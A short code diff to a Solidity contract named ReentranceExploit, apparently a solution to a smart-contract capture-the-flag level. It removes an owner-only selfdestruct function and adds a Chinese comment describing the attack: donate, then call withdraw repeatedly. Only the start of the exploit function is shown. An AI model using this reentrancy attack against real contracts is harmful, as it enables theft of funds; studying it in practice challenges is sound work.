@@ -13,11 +13,6 @@ contract ReentranceExploit {
         owner = _owner;
     }
 
-    function close() external {
-        require(msg.sender == owner);
-        selfdestruct(owner);
-    }
-
     function exploit(address _target) external payable {
         Reentrance target = Reentrance(_target);
         target.donate{value: msg.value}(address(this));
@@ -31,3 +26,5 @@ contract ReentranceExploit {
         }
     }
 }
+
+//捐赠并提取，重复调用withdraw
